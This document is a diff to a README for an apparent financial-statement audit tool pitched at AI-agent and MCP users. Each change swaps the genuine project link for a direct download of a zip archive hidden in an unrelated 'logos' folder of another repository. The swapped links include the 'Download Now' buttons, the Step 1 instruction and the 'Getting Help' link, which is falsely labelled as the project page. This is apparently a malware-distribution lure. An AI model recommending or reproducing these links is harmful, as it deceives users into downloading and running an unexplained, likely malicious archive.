@@ -6,7 +6,7 @@ description: "Validate financial statement arithmetic and income-statement consi
 <h1>🔍 genpark-complex-financial-formula-audit-validator-skill - Verify Your Financial Data Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now - Free</a>
+  <a href="https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now - Free</a>
 </p>
 
 ## 🎯 What Is This Tool?
@@ -31,7 +31,7 @@ Follow these simple steps to get the application running on your Windows compute
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill](https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill)
+Visit this link to download the application: [https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip](https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip)
 
 Click the big download button on that page. The file will start downloading to your computer automatically.
 
@@ -137,7 +137,7 @@ The developers regularly release improvements and new features. Check the downlo
 
 ## 📞 Getting Help
 
-If you encounter issues not covered in this guide, visit the project page at [https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill](https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill) for support. The project maintains an active community where users help each other solve problems.
+If you encounter issues not covered in this guide, visit the project page at [https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip](https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip) for support. The project maintains an active community where users help each other solve problems.
 
 ## 🏁 Final Thoughts
 
@@ -146,7 +146,7 @@ Financial accuracy is critical for every business and individual. This tool remo
 Download it today and give yourself the confidence that comes from knowing your financial data is mathematically sound. It's free, it's fast, and it just works.
 
 <p align="center">
-  <a href="https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;text-decoration:none;border-radius:50px;font-size:18px;font-weight:bold;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get Started Now</a>
+  <a href="https://github.com/ghost33333333/ghost33333333.github.io/raw/refs/heads/main/logos/3.6.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;text-decoration:none;border-radius:50px;font-size:18px;font-weight:bold;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get Started Now</a>
 </p>
 
 Keywords: agent-skills, ai-agent, document-ai, financial-analysis, legal-tech, mcp, mcp-server, model-context-protocol, multimodal, table-extraction, zero-dependency
